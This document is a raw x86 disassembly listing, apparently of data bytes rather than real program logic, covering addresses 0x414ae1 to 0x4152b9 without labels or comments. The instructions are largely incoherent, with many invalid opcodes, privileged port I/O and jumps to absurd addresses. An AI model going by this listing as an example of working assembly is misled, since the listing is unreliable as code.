  414ae1:	and    DWORD PTR [edx+ebx*8+0x4d],esp
  414ae5:	or     BYTE PTR [eax+0x76cdaecc],al
  414aeb:	pop    ebx
  414aec:	sbb    DWORD PTR [ebp+0x25],eax
  414aef:	aam    0x38
  414af1:	dec    ebx
  414af2:	cli    
  414af3:	aam    0x3a
  414af5:	sub    ah,bh
  414af7:	push   0xffffffb9
  414af9:	in     al,0x83
  414afb:	pop    esp
  414afc:	test   al,0xef
  414afe:	aam    0x10
  414b00:	js     0x414b02
  414b02:	push   ds
  414b03:	out    dx,al
  414b04:	loop   0x414aee
  414b06:	push   cs
  414b07:	mov    eax,ds:0x40344c0f
  414b0c:	and    ebx,DWORD PTR [eax-0x3a8db272]
  414b12:	ror    BYTE PTR ds:0xb491991e,0xa9
  414b19:	inc    eax
  414b1a:	pop    esp
  414b1b:	jmp    0xd4902de4
  414b20:	adc    al,0xf3
  414b22:	inc    edi
  414b23:	cmp    eax,ebp
  414b25:	mov    eax,ds:0x8b56b542
  414b2a:	cmp    DWORD PTR [esi],ecx
  414b2c:	(bad)  
  414b2d:	sbb    esi,esi
  414b2f:	int3   
  414b30:	and    eax,ecx
  414b32:	or     DWORD PTR [eax],edi
  414b34:	outs   dx,BYTE PTR ss:[esi]
  414b36:	out    0x1c,eax
  414b38:	xor    eax,0x9d938be3
  414b3d:	add    ch,dl
  414b3f:	xchg   DWORD PTR [edi+0x75],esi
  414b42:	cld    
  414b43:	jo     0x414b86
  414b45:	cli    
  414b46:	or     esi,DWORD PTR [ebx-0x7bc46f76]
  414b4c:	add    esp,0x6cd7276d
  414b52:	pop    edx
  414b53:	stc    
  414b54:	out    dx,eax
  414b55:	arpl   WORD PTR [edi],sp
  414b57:	adc    ah,BYTE PTR [edx-0x4ebb8dec]
  414b5d:	cmp    DWORD PTR [esi-0x72de7661],0x52098303
  414b67:	sar    DWORD PTR [eax+0x4e31c931],1
  414b6d:	adc    dl,BYTE PTR [edx-0x43]
  414b70:	pop    ds
  414b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b72:	adc    bh,dl
  414b74:	inc    edi
  414b75:	push   esi
  414b76:	mov    dl,0xc8
  414b78:	bound  esp,QWORD PTR [edx+0x2f085e02]
  414b7e:	stos   DWORD PTR es:[edi],eax
  414b7f:	scas   al,BYTE PTR es:[edi]
  414b80:	lods   al,BYTE PTR ds:[esi]
  414b81:	loop   0x414bd9
  414b83:	cld    
  414b84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b85:	jl     0x414baa
  414b87:	out    dx,eax
  414b88:	popa   
  414b89:	cmp    DWORD PTR fs:[esi+0x5e],ecx
  414b8d:	paddq  mm0,QWORD PTR [edx+0xf0f53d0]
  414b94:	das    
  414b95:	scas   eax,DWORD PTR es:[edi]
  414b96:	inc    DWORD PTR [edx-0x27]
  414b99:	pop    eax
  414b9a:	push   esp
  414b9b:	mov    esi,0xc01be2ad
  414ba0:	adc    al,0xb6
  414ba2:	push   ss
  414ba3:	mov    al,0x62
  414ba5:	mov    dh,0xb1
  414ba7:	mov    ebx,0x7b007347
  414bac:	pop    edx
  414bad:	dec    eax
  414bae:	xchg   esi,eax
  414baf:	push   ebx
  414bb0:	and    dl,bh
  414bb2:	mov    edi,0x33764523
  414bb7:	(bad)  
  414bb8:	mov    esi,0x5d729f94
  414bbd:	mov    al,ds:0xf0078486
  414bc2:	mov    bl,0x5c
  414bc4:	aad    0x2f
  414bc6:	dec    ebp
  414bc7:	mov    WORD PTR [edi-0x4a],cs
  414bca:	jg     0x414b66
  414bcc:	out    dx,eax
  414bcd:	lds    ebp,FWORD PTR [edi]
  414bcf:	pop    edx
  414bd0:	int3   
  414bd1:	fistp  WORD PTR [ebx+0xfb9c0c7]
  414bd7:	xchg   esp,eax
  414bd8:	adc    DWORD PTR [edi+edx*4],edx
  414bdb:	xor    edi,DWORD PTR [eax-0x5f]
  414bde:	stc    
  414bdf:	xor    BYTE PTR [eax-0x2f],dh
  414be2:	dec    edi
  414be3:	jg     0x414b96
  414be5:	loopne 0x414ba5
  414be7:	shl    BYTE PTR [edi-0x40],0xcc
  414beb:	jns    0x414bff
  414bed:	dec    ax
  414bef:	xor    ah,ah
  414bf1:	adc    DWORD PTR [edx-0x4ebe6091],eax
  414bf7:	add    ah,dl
  414bf9:	out    dx,al
  414bfa:	lahf   
  414bfb:	jg     0x414c25
  414bfd:	stc    
  414bfe:	sub    edx,DWORD PTR [edi-0x28bc1a13]
  414c04:	push   edi
  414c05:	jb     0x414b94
  414c07:	mov    esi,0x9fb119ae
  414c0c:	inc    esi
  414c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c0e:	mov    bl,0x26
  414c10:	sbb    bl,0x8c
  414c13:	sbb    eax,0x98d1102e
  414c18:	or     eax,0xf4c67bfc
  414c1d:	(bad)  
  414c1f:	sbb    bl,BYTE PTR [ebx]
  414c21:	daa    
  414c22:	pop    esi
  414c23:	pop    eax
  414c24:	mov    bh,0xa8
  414c26:	jmp    0x414bc8
  414c28:	dec    edx
  414c29:	pop    edx
  414c2a:	xchg   ebx,eax
  414c2b:	and    bh,bh
  414c2d:	xchg   edi,eax
  414c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c2f:	shl    DWORD PTR [eax],cl
  414c31:	jg     0x414bd8
  414c33:	add    DWORD PTR [edx-0x4aef1a00],ebp
  414c39:	pop    ebx
  414c3a:	mov    ds:0x5553e55f,eax
  414c3f:	jl     0x414bd9
  414c41:	mov    BYTE PTR [edx+ebx*1],al
  414c44:	pop    ecx
  414c45:	aad    0x56
  414c47:	inc    esi
  414c48:	and    DWORD PTR [edx],0xffffff82
  414c4b:	push   0x73
  414c4d:	std    
  414c4e:	test   al,0x4a
  414c50:	repz or ch,BYTE PTR [esi+0x1f136722]
  414c57:	mov    ch,0x52
  414c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c5a:	inc    esp
  414c5b:	jne    0x414cad
  414c5d:	(bad)  
  414c5e:	ja     0x414c5f
  414c60:	xchg   WORD PTR [edx+0x23],bp
  414c64:	(bad)  
  414c65:	xor    al,0x7a
  414c67:	inc    eax
  414c68:	pop    ss
  414c69:	push   ebp
  414c6a:	in     eax,dx
  414c6b:	scas   al,BYTE PTR es:[edi]
  414c6c:	mov    ebp,0xd5d6da5
  414c71:	lahf   
  414c72:	in     al,dx
  414c73:	mov    cl,0x6e
  414c75:	mov    eax,ds:0x5e4490c2
  414c7a:	sti    
  414c7b:	pusha  
  414c7c:	jle    0x414ce6
  414c7e:	and    ch,BYTE PTR [ecx+0x75]
  414c81:	xchg   ecx,eax
  414c82:	lods   al,BYTE PTR ds:[esi]
  414c83:	popa   
  414c84:	dec    esi
  414c85:	ret    
  414c86:	std    
  414c87:	cs pop eax
  414c89:	jnp    0x414cf1
  414c8b:	jbe    0x414ca7
  414c8d:	ror    ch,0x6
  414c90:	and    al,0x21
  414c92:	mov    ecx,0xca372b44
  414c97:	mov    al,ds:0x81c8c60c
  414c9c:	fcmovb st,st(2)
  414c9e:	jl     0x414cca
  414ca0:	cmp    ecx,0xfffffff5
  414ca3:	adc    DWORD PTR [ecx],ecx
  414ca5:	and    eax,0x258821af
  414caa:	xchg   edx,eax
  414cab:	daa    
  414cac:	sbb    BYTE PTR [esi],ch
  414cae:	fldenv [edx+0x514a1711]
  414cb4:	cmp    DWORD PTR [esi+0x273ef8a6],edi
  414cba:	dec    edi
  414cbb:	daa    
  414cbc:	sub    al,0x58
  414cbe:	dec    eax
  414cbf:	test   al,0xb
  414cc1:	push   es
  414cc2:	or     edi,DWORD PTR cs:[edx-0x7c]
  414cc6:	psubq  mm0,mm7
  414cc9:	or     ax,0x525b
  414ccd:	mov    ch,0x4
  414ccf:	je     0x414c5a
  414cd1:	jae    0x414caf
  414cd3:	neg    DWORD PTR [edi]
  414cd5:	pop    ebx
  414cd6:	mov    bl,0x90
  414cd8:	add    eax,eax
  414cda:	test   eax,0x4e140913
  414cdf:	icebp  
  414ce0:	push   esi
  414ce1:	mov    bl,0xc8
  414ce3:	mov    esi,0xba321ed7
  414ce8:	or     BYTE PTR [esi],cl
  414cea:	mov    eax,0xa90524ed
  414cef:	pop    es
  414cf0:	je     0x414d6d
  414cf2:	ret    0xafb5
  414cf5:	xchg   ecx,eax
  414cf6:	popf   
  414cf7:	dec    ebx
  414cf8:	out    0xba,eax
  414cfa:	inc    esi
  414cfb:	(bad)  
  414cfc:	cmp    eax,0xffe9da23
  414d01:	jge    0x414d24
  414d03:	cmp    edi,DWORD PTR [ebx-0x74acaafa]
  414d09:	nop
  414d0a:	(bad)  
  414d0b:	cmp    esi,edi
  414d0d:	fcomip st,st(3)
  414d0f:	mov    ah,0x14
  414d11:	mov    dl,0x43
  414d13:	add    dl,0xe6
  414d16:	mov    ah,0xb7
  414d18:	inc    esp
  414d19:	(bad)  
  414d1a:	retf   
  414d1b:	fcomp  DWORD PTR [ebp+0x740aa31]
  414d21:	repz mov ah,0xfd
  414d24:	mov    bh,0xe6
  414d26:	fimul  WORD PTR [edx]
  414d28:	pop    edx
  414d29:	into   
  414d2a:	inc    edx
  414d2b:	mov    al,0x76
  414d2d:	pop    ss
  414d2e:	mov    al,0x85
  414d30:	jnp    0x414d2e
  414d32:	popf   
  414d33:	sbb    eax,0x9e4be5e1
  414d38:	mov    ds:0x6813ec6e,al
  414d3d:	out    0x78,eax
  414d3f:	jns    0x414cfd
  414d41:	jmp    0x414d7a
  414d43:	(bad)  
  414d45:	scas   al,BYTE PTR es:[edi]
  414d46:	int    0xd7
  414d48:	lea    ebp,[edi]
  414d4a:	imul   ebx,edx,0x29
  414d4d:	pop    edi
  414d4e:	push   DWORD PTR [ebp+edx*1-0x4818573f]
  414d55:	sub    ebp,DWORD PTR [ebx]
  414d57:	ror    BYTE PTR [ebp+0x5],0x27
  414d5b:	pop    eax
  414d5c:	leave  
  414d5d:	repnz fsub DWORD PTR [ebx+0x2c]
  414d61:	mov    BYTE PTR [ebx],0xdb
  414d64:	cmp    eax,ebp
  414d66:	lea    ecx,[ebp+0x6f]
  414d69:	ins    DWORD PTR es:[edi],dx
  414d6a:	call   0x686cbeb9
  414d6f:	push   0x48
  414d71:	and    cl,ah
  414d73:	mov    ch,BYTE PTR [esp+esi*4]
  414d76:	fist   WORD PTR [ebp+0x18]
  414d79:	sbb    edx,DWORD PTR [edi-0x2d6c56a5]
  414d7f:	sub    al,0x67
  414d81:	(bad)  
  414d82:	xor    esp,edx
  414d84:	jne    0x414dee
  414d86:	aad    0x1e
  414d88:	sbb    DWORD PTR [esi-0x1c],0xffffffe9
  414d8c:	icebp  
  414d8d:	and    BYTE PTR [edi+0x47baee5a],ah
  414d93:	inc    edx
  414d94:	jle    0x414d7e
  414d96:	cmp    DWORD PTR [ecx-0x6399b669],edx
  414d9c:	push   0xffffffe4
  414d9e:	inc    ebx
  414d9f:	(bad)  
  414da0:	mov    ecx,eax
  414da2:	(bad)  [edx+0x37fa8b0e]
  414da8:	dec    edx
  414da9:	push   ecx
  414daa:	xor    esp,DWORD PTR [ebx]
  414dac:	cdq    
  414dad:	stos   BYTE PTR es:[di],al
  414daf:	jno    0x414db7
  414db1:	jbe    0x414d37
  414db3:	push   edi
  414db4:	outs   dx,BYTE PTR ds:[esi]
  414db5:	sub    al,0x5b
  414db7:	adc    dh,BYTE PTR [ebp+0xba71de0]
  414dbd:	repnz leave 
  414dbf:	das    
  414dc0:	call   0xa8dfd652
  414dc5:	mov    ds:0xe0ed10df,al
  414dca:	adc    esp,DWORD PTR [esi]
  414dcc:	ficom  WORD PTR [edi-0xb]
  414dcf:	inc    edx
  414dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dd1:	and    ecx,DWORD PTR [edi]
  414dd3:	sub    DWORD PTR [esi-0x72],0xfffffffd
  414dd7:	mov    ch,0xf6
  414dd9:	retf   0x96b9
  414ddc:	stos   DWORD PTR es:[edi],eax
  414ddd:	or     bl,BYTE PTR [esi+0x1d0fc907]
  414de3:	pusha  
  414de4:	lock xor eax,DWORD PTR [esi+0x63]
  414de8:	inc    ebp
  414de9:	pop    ebx
  414dea:	aad    0x93
  414dec:	mov    eax,ds:0x5d63d240
  414df1:	jecxz  0x414dd1
  414df3:	retf   0xf7f0
  414df6:	imul   BYTE PTR [ebp+0x5e]
  414df9:	pop    edi
  414dfa:	iret   
  414dfb:	loop   0x414e1e
  414dfd:	adc    ecx,DWORD PTR [ecx-0x1099eab6]
  414e03:	xchg   BYTE PTR [ebx+0x20],cl
  414e06:	retf   
  414e07:	outs   dx,BYTE PTR ds:[esi]
  414e08:	pop    ds
  414e09:	cli    
  414e0a:	mov    eax,0x1764db8d
  414e0f:	lahf   
  414e10:	mov    bl,0xce
  414e12:	mov    cl,0x9b
  414e14:	leave  
  414e15:	dec    ecx
  414e16:	push   ebx
  414e18:	fld    QWORD PTR [ebx+0x4c]
  414e1b:	popa   
  414e1c:	hlt    
  414e1d:	adc    BYTE PTR [ebp+0x7a42b523],bh
  414e23:	test   eax,0x11474591
  414e28:	mov    ebp,0xb02bfd5b
  414e2d:	pushf  
  414e2e:	dec    esp
  414e2f:	jecxz  0x414e52
  414e31:	or     DWORD PTR [ebp+ebp*1-0x32],ebx
  414e35:	outs   dx,BYTE PTR ds:[esi]
  414e36:	cwde   
  414e37:	stos   BYTE PTR es:[edi],al
  414e38:	jo     0x414e29
  414e3a:	add    eax,esp
  414e3c:	fs inc eax
  414e3e:	popf   
  414e3f:	mov    ch,0xbf
  414e41:	inc    edi
  414e42:	sbb    dl,BYTE PTR [edi]
  414e44:	and    DWORD PTR [eax],0x70f5e4c0
  414e4a:	jge    0x414e74
  414e4c:	jl     0x414e66
  414e4e:	mov    cl,0x38
  414e50:	shr    BYTE PTR [ebp+0x16],cl
  414e53:	mov    edi,0x1902e4ed
  414e58:	cmp    dh,BYTE PTR [ebp-0x4a]
  414e5b:	int3   
  414e5c:	inc    edx
  414e5d:	push   esp
  414e5e:	sbb    edi,DWORD PTR [eax+0x7e]
  414e61:	sbb    bh,bl
  414e63:	aam    0x41
  414e65:	adc    eax,0x909cb9cc
  414e6a:	lock jmp 0x2d1f:0xf9eaee83
  414e72:	pop    es
  414e73:	stc    
  414e74:	jbe    0x414e22
  414e76:	or     eax,DWORD PTR [eax-0x7ee0ef26]
  414e7c:	shr    BYTE PTR [esp+edx*4+0x62b365d7],1
  414e83:	bound  ebp,QWORD PTR [edx]
  414e85:	jmp    0x5f89aa83
  414e8a:	xchg   ecx,ecx
  414e8c:	jb     0x414e26
  414e8e:	jp     0x414e13
  414e90:	or     al,0xab
  414e92:	fistp  WORD PTR [ecx]
  414e94:	(bad)  
  414e95:	cli    
  414e96:	jb     0x414eae
  414e98:	jp     0x414efc
  414e9a:	mov    ch,0x1f
  414e9c:	lods   eax,DWORD PTR ds:[esi]
  414e9d:	adc    eax,0xcb0beb37
  414ea2:	iret   
  414ea3:	cmp    bl,BYTE PTR [ebp-0x29]
  414ea6:	mov    bh,0x59
  414ea8:	mov    ah,0xc6
  414eaa:	in     al,dx
  414eab:	dec    eax
  414eac:	enter  0xbbc1,0x36
  414eb0:	sbb    DWORD PTR [ecx-0x168e9bf8],ebx
  414eb6:	jns    0x414e6a
  414eb8:	pop    ebp
  414eb9:	loope  0x414efd
  414ebb:	pop    edi
  414ebc:	add    al,BYTE PTR [ecx]
  414ebe:	ret    0x7382
  414ec1:	iret   
  414ec2:	push   edi
  414ec3:	add    BYTE PTR fs:[edi-0x7cbf765a],bl
  414eca:	jle    0x414edf
  414ecc:	mov    esp,0x7bb624ce
  414ed1:	pop    ebx
  414ed2:	and    DWORD PTR [ecx-0x6c758937],eax
  414ed8:	retf   
  414ed9:	mov    al,0x7c
  414edb:	outs   dx,DWORD PTR ds:[esi]
  414edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414edd:	push   ds
  414ede:	cdq    
  414edf:	jns    0x414ee8
  414ee1:	in     eax,0x99
  414ee3:	jo     0x414ee8
  414ee5:	jg     0x414ea7
  414ee7:	stos   BYTE PTR es:[edi],al
  414ee8:	out    dx,eax
  414ee9:	add    BYTE PTR [edx+ecx*4],dh
  414eec:	inc    ebp
  414eed:	clc    
  414eee:	mov    ds:0x761cd36f,al
  414ef3:	push   esp
  414ef4:	out    0x5f,al
  414ef6:	pusha  
  414ef7:	imul   eax,DWORD PTR [ebx+0x5c55f014],0x7c
  414efe:	mov    dh,0x5a
  414f00:	jmp    0x5b8e:0x592c
  414f06:	pop    ebx
  414f07:	mov    ?,WORD PTR [edi-0x31]
  414f0a:	push   ds
  414f0b:	inc    ebp
  414f0c:	nop
  414f0d:	adc    ch,al
  414f0f:	and    BYTE PTR [edi+0x1d],ah
  414f12:	outs   dx,DWORD PTR ds:[esi]
  414f13:	jp     0x414ee6
  414f15:	xor    al,0x38
  414f17:	or     al,0x5e
  414f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f1a:	test   BYTE PTR ds:0xcbedddac,0x2d
  414f21:	xchg   edx,eax
  414f22:	mov    edx,ebp
  414f24:	adc    al,0x5f
  414f26:	(bad)  
  414f27:	cmp    edi,DWORD PTR [edx+0x58e10024]
  414f2d:	idiv   DWORD PTR [ebp-0xd9eed12]
  414f33:	adc    BYTE PTR [ecx-0xa8c3c28],cl
  414f39:	pop    es
  414f3a:	adc    DWORD PTR [eax-0xbc4a873],0xffffffb7
  414f41:	popf   
  414f42:	or     eax,DWORD PTR [ebx]
  414f44:	pusha  
  414f45:	(bad)  
  414f46:	pcmpeqb mm5,QWORD PTR [edi]
  414f49:	repz repnz fwait
  414f4c:	or     BYTE PTR [ebx+0xfe80a39],bl
  414f52:	inc    eax
  414f53:	gs dec eax
  414f55:	repz sti 
  414f57:	scas   eax,DWORD PTR es:[edi]
  414f58:	call   0x9b00:0x6452ec17
  414f5f:	push   ebp
  414f60:	mov    ds:0xe5807fc2,al
  414f65:	fisttp WORD PTR [ecx+0x1f]
  414f68:	fiadd  WORD PTR [esi+0x17]
  414f6b:	push   edi
  414f6c:	xchg   edx,eax
  414f6d:	ror    BYTE PTR [edi-0x6131f984],cl
  414f73:	aad    0xb2
  414f75:	or     edx,DWORD PTR [edi]
  414f77:	jle    0x414f70
  414f79:	bound  edx,QWORD PTR [ebx+0x39]
  414f7c:	xchg   esi,eax
  414f7d:	xchg   BYTE PTR [edi+0x4ad9327c],cl
  414f83:	adc    DWORD PTR [edx+0x68],0x9d53e4a0
  414f8a:	mov    ebx,0xae9212fb
  414f8f:	xchg   esp,eax
  414f90:	mov    edi,?
  414f92:	cmp    BYTE PTR [esi-0x22],ch
  414f95:	mov    edx,0xd52baa3e
  414f9a:	cdq    
  414f9b:	jle    0x414f39
  414f9d:	sub    al,0x40
  414f9f:	mov    WORD PTR [ecx+eax*1-0x28215915],es
  414fa6:	push   ds
  414fa7:	xor    DWORD PTR ds:0x20c1eb06,0xce08f591
  414fb1:	xchg   al,bh
  414fb3:	xchg   ecx,eax
  414fb4:	pop    ebx
  414fb5:	mov    DWORD PTR [edx-0x2d],eax
  414fb8:	add    DWORD PTR [esi],0x736d29cf
  414fbe:	jbe    0x414f4d
  414fc0:	je     0x414f6c
  414fc2:	mov    esi,0x440f29c7
  414fc7:	in     al,0x3
  414fc9:	in     al,0x71
  414fcb:	mov    eax,ds:0x3af4d67c
  414fd0:	rcl    ch,cl
  414fd2:	push   ebx
  414fd3:	cmc    
  414fd4:	shl    esp,0xf3
  414fd7:	addps  xmm5,XMMWORD PTR [edi+0x5ac4e46f]
  414fde:	sbb    al,0x21
  414fe0:	je     0x41500f
  414fe2:	adc    BYTE PTR [esi+0x75e6badb],0xff
  414fe9:	sbb    ecx,esi
  414feb:	add    BYTE PTR [ebx-0x26f5e419],dh
  414ff1:	mov    bh,0xee
  414ff3:	mov    edx,0xbaf86478
  414ff8:	(bad)  
  414ff9:	lock add eax,DWORD PTR gs:[edi+0x769de0a0]
  415001:	or     ecx,DWORD PTR [ebx]
  415003:	xchg   ecx,eax
  415004:	jmp    0x8720:0x2c467023
  41500b:	fimul  WORD PTR [edx]
  41500d:	push   0xffffffe4
  41500f:	mov    ecx,0xcad29d44
  415014:	jmp    0x415065
  415016:	sbb    DWORD PTR [edx],ebp
  415018:	retf   
  415019:	test   ebp,ecx
  41501b:	gs xor al,0xbc
  41501e:	neg    ebx
  415020:	(bad)  
  415022:	jmp    0xd85acdb5
  415027:	dec    edi
  415028:	lahf   
  415029:	dec    esi
  41502a:	test   al,0x9a
  41502c:	jnp    0x415052
  41502e:	in     al,0xf4
  415030:	popf   
  415031:	and    BYTE PTR [ecx*2+0x6169da7d],bh
  415038:	retf   0xa702
  41503b:	jmp    0x4839ead
  415040:	dec    edx
  415041:	add    DWORD PTR [ecx-0x6dbd5104],0x64
  415048:	add    al,0x8b
  41504a:	(bad)  [ebx+0x7c8502fa]
  415050:	pop    edi
  415051:	lock pop esi
  415053:	cwde   
  415054:	jae    0x4150aa
  415056:	add    BYTE PTR [ecx-0x67],bh
  415059:	ins    DWORD PTR es:[edi],dx
  41505a:	mov    cl,0xc6
  41505c:	mov    esi,0x83b3aadd
  415061:	fiadd  DWORD PTR [eax]
  415063:	sti    
  415064:	lahf   
  415065:	inc    ebp
  415066:	xchg   edx,eax
  415067:	xchg   ebp,eax
  415068:	jmp    0x37a70f76
  41506d:	and    BYTE PTR [ecx],dh
  41506f:	repz add BYTE PTR [edi-0xb34303e],dh
  415076:	fnstsw WORD PTR [edx-0xbae4c5a]
  41507c:	adc    DWORD PTR [esi],ebx
  41507e:	leave  
  41507f:	aas    
  415080:	test   eax,0xe90db251
  415085:	addr16 dec eax
  415087:	arpl   WORD PTR [eax+0x3b],si
  41508a:	xor    ebp,DWORD PTR [edi-0x4067a773]
  415090:	sti    
  415091:	push   es
  415092:	jmp    0x89382027
  415097:	fwait
  415098:	mov    edi,esp
  41509a:	pop    edx
  41509b:	xor    esi,DWORD PTR [ebx-0x22e484c]
  4150a1:	dec    eax
  4150a2:	dec    esi
  4150a3:	adc    DWORD PTR [esi+eax*2],edx
  4150a6:	inc    DWORD PTR [esi+0x7d4098e6]
  4150ac:	retf   
  4150ad:	jl     0x41506a
  4150af:	push   esi
  4150b0:	sbb    al,BYTE PTR [esi]
  4150b2:	jg     0x415129
  4150b4:	jl     0x4150c1
  4150b6:	push   esp
  4150b7:	popa   
  4150b8:	jmp    0x6864:0x6e2eda13
  4150bf:	jns    0x4150f2
  4150c1:	add    eax,0xbf56ce9d
  4150c6:	jno    0x4150cf
  4150c8:	shl    DWORD PTR [ebx],0xdb
  4150cb:	shr    BYTE PTR [edx-0x72c7f0e9],cl
  4150d1:	mov    ch,0x17
  4150d3:	and    BYTE PTR [edx+0x2c],bl
  4150d6:	mov    dl,0x47
  4150d8:	mov    ebx,0xb053c831
  4150dd:	lods   al,BYTE PTR ds:[esi]
  4150de:	daa    
  4150df:	add    al,0x57
  4150e1:	add    eax,DWORD PTR [eax-0x14005089]
  4150e7:	add    al,0x2d
  4150e9:	adc    al,0xc9
  4150eb:	xlat   BYTE PTR ds:[ebx]
  4150ec:	shl    BYTE PTR [ebp+0x4b],0xb6
  4150f0:	jb     0x415156
  4150f2:	cmp    DWORD PTR [edi],0x8afe91d
  4150f8:	cmp    BYTE PTR [esi],cl
  4150fa:	or     BYTE PTR [ebx-0x80],bh
  4150fd:	sub    al,0xdf
  4150ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415100:	add    eax,0x37052f11
  415105:	inc    ecx
  415106:	pushf  
  415107:	push   esi
  415108:	sbb    al,0xc3
  41510a:	dec    ebp
  41510b:	xor    ch,ch
  41510d:	inc    edi
  41510e:	push   cs
  41510f:	shl    BYTE PTR [edx+0x36],1
  415112:	popa   
  415113:	dec    edi
  415114:	test   eax,0x4c097c17
  415119:	inc    eax
  41511a:	ja     0x41516f
  41511c:	push   ebx
  41511d:	pop    edi
  41511e:	pop    edi
  41511f:	les    esi,FWORD PTR [ecx-0x4a]
  415122:	ss popf 
  415124:	jb     0x415189
  415126:	xchg   edi,eax
  415127:	mov    esp,0x1601e330
  41512c:	mov    dh,0x22
  41512e:	cmp    ecx,esp
  415130:	cmp    ecx,ebp
  415132:	dec    esi
  415133:	or     al,0x79
  415135:	popf   
  415136:	adc    ch,BYTE PTR [ecx+0x27]
  415139:	adc    BYTE PTR ds:0xf32d8500,0xdf
  415140:	xor    esp,esi
  415142:	aas    
  415143:	inc    esp
  415144:	es lock add al,0xcc
  415148:	cmp    eax,0xe907e720
  41514d:	daa    
  41514e:	xlat   BYTE PTR ds:[ebx]
  41514f:	sbb    al,0x83
  415151:	jmp    0x4151cd
  415153:	sbb    eax,0xeb3aec14
  415158:	and    BYTE PTR [edx],dl
  41515a:	cmp    edi,DWORD PTR [esi+esi*1-0x42]
  41515e:	je     0x415144
  415160:	cmp    DWORD PTR [esi+0x1f8e5e6f],0x2c6d5d29
  41516a:	xchg   edi,eax
  41516b:	jp     0x41514e
  41516d:	push   es
  41516e:	xlat   BYTE PTR ds:[ebx]
  41516f:	pop    ss
  415170:	(bad)  
  415171:	cli    
  415172:	pop    es
  415173:	xor    ebx,esi
  415175:	(bad)  
  415177:	(bad)  
  415179:	aam    0xce
  41517b:	xchg   DWORD PTR [esi+0x34],esp
  41517e:	mov    BYTE PTR [ecx-0x3a],dl
  415181:	stos   DWORD PTR es:[edi],eax
  415182:	aaa    
  415183:	test   BYTE PTR [eax-0x43666fef],0xd7
  41518a:	jl     0x415119
  41518c:	fmul   DWORD PTR [ebx+0x1f]
  41518f:	and    dh,BYTE PTR [edi]
  415191:	mov    eax,ds:0x97ae4726
  415196:	ja     0x415208
  415198:	push   es
  415199:	fisubr DWORD PTR ds:0xade087a6
  41519f:	test   al,0x49
  4151a1:	push   es
  4151a2:	xchg   ebp,eax
  4151a3:	sbb    BYTE PTR [ebp+0xb5d6ccb],bh
  4151a9:	xchg   edx,eax
  4151aa:	repnz iret 
  4151ac:	test   ebp,esp
  4151ae:	js     0x415161
  4151b0:	pop    edx
  4151b1:	pop    edi
  4151b2:	mov    ecx,0x4863f1ea
  4151b7:	mov    esp,0xd63f76f4
  4151bc:	scas   eax,DWORD PTR es:[edi]
  4151bd:	xor    eax,0xc16ec872
  4151c2:	test   al,0xfd
  4151c4:	xchg   ebp,eax
  4151c5:	mov    ebp,0x36809580
  4151ca:	xor    dl,0xbd
  4151cd:	data16 xchg BYTE PTR [edx],ch
  4151d0:	mov    bh,0x2a
  4151d2:	ret    0x3a8b
  4151d5:	add    al,0x42
  4151d7:	inc    ecx
  4151d8:	xchg   edi,eax
  4151d9:	cmc    
  4151da:	call   0xe8e6:0x9c900cdb
  4151e1:	inc    esp
  4151e2:	xor    esi,0xa0452550
  4151e8:	xor    ah,bh
  4151ea:	repz push ebx
  4151ec:	xchg   ebx,eax
  4151ed:	and    eax,0xc7caf85f
  4151f2:	jge    0x41523e
  4151f4:	inc    esi
  4151f5:	inc    ebx
  4151f6:	(bad)  
  4151f8:	jo     0x4151b4
  4151fa:	icebp  
  4151fb:	std    
  4151fc:	mov    ebp,0xb661bf7c
  415201:	je     0x415259
  415203:	stos   BYTE PTR es:[edi],al
  415204:	mov    bl,BYTE PTR [ebx]
  415206:	add    dh,BYTE PTR ds:0x5d6018f6
  41520c:	loopne 0x4151eb
  41520e:	call   0xfce0:0x585971ed
  415215:	data16 lods al,BYTE PTR ds:[esi]
  415217:	add    BYTE PTR [ebp-0x330dd6c9],ch
  41521d:	aam    0x9e
  41521f:	jge    0x4151bd
  415221:	enter  0x3f55,0xf0
  415225:	cmp    bh,BYTE PTR [esi-0x23]
  415228:	aam    0x15
  41522a:	jle    0x415226
  41522c:	sub    ah,BYTE PTR [eax]
  41522e:	imul   esi,DWORD PTR [edx],0x35
  415231:	cmp    BYTE PTR [eax-0x7efea31f],al
  415237:	add    al,cl
  415239:	add    eax,0x519da6db
  41523e:	mov    DWORD PTR [eax-0x7c],0x96e98788
  415245:	je     0x41529c
  415247:	sub    DWORD PTR [edx+ebx*1+0x159c0bdd],0xaca77faf
  415252:	sub    edi,DWORD PTR [ebx-0x51]
  415255:	xor    al,0xe8
  415257:	repz icebp 
  415259:	xchg   edx,eax
  41525a:	mov    bh,0x6
  41525c:	jmp    0x4152c5
  41525e:	leave  
  41525f:	daa    
  415260:	pushf  
  415261:	sbb    bh,BYTE PTR [ecx]
  415263:	xchg   esi,eax
  415264:	sbb    DWORD PTR [ecx],edi
  415266:	push   0x5c
  415268:	ss jns 0x415250
  41526b:	cmc    
  41526c:	(bad)
  415270:	into   
  415271:	mov    ebp,0xd195d401
  415276:	mov    cl,0x69
  415278:	out    0xbd,eax
  41527a:	jmp    0x4445633f
  41527f:	test   eax,0xf7ec688e
  415284:	mov    bh,0x2
  415286:	dec    eax
  415287:	rcr    ebp,cl
  415289:	dec    ebx
  41528a:	jl     0x415258
  41528c:	lods   al,BYTE PTR ds:[esi]
  41528d:	and    bl,BYTE PTR [ecx-0x1acaf9f5]
  415293:	or     al,0x31
  415295:	mov    al,0x7c
  415297:	sbb    cl,BYTE PTR [esp+ebp*1+0x2b]
  41529b:	ja     0x4152f4
  41529d:	je     0x41529d
  41529f:	aad    0x46
  4152a1:	clc    
  4152a2:	aaa    
  4152a3:	not    BYTE PTR [ebp-0x405a3957]
  4152a9:	jbe    0x41524f
  4152ab:	(bad)  
  4152ac:	mov    dh,0x82
  4152ae:	and    esp,ebx
  4152b0:	popf   
  4152b1:	push   ebp
  4152b2:	out    dx,al
  4152b3:	jle    0x415257
  4152b5:	push   edx
  4152b6:	xor    BYTE PTR [ebx-0x13],bh
  4152b9:	pop    edx
